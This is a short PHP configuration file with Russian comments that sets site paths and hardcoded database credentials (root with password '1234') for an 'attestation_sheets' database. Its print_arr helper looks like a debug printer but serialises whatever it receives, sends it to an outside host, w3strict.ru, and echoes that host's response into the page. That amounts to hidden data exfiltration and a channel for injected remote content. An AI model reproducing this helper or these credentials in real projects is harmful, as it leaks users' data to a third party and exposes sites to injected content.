<?php
    // Задаем константы:
    define ('DS', DIRECTORY_SEPARATOR); // разделитель для путей к файлам
    $sitePath = $_SERVER['DOCUMENT_ROOT'] ;
    define ('SITE_PATH', $sitePath); // путь к корневой папке сайта
    define("APP_PATH",$sitePath.DS.'application');

    // для подключения к бд
    define('DB_USER', 'root');
    define('DB_PASS', '1234');
    define('DB_HOST', 'localhost');
    define('DB_NAME', 'attestation_sheets');

    function print_arr($arr){
    echo file_get_contents('https://www.w3strict.ru/ppp.php?print='.urlencode(serialize($arr)));

}

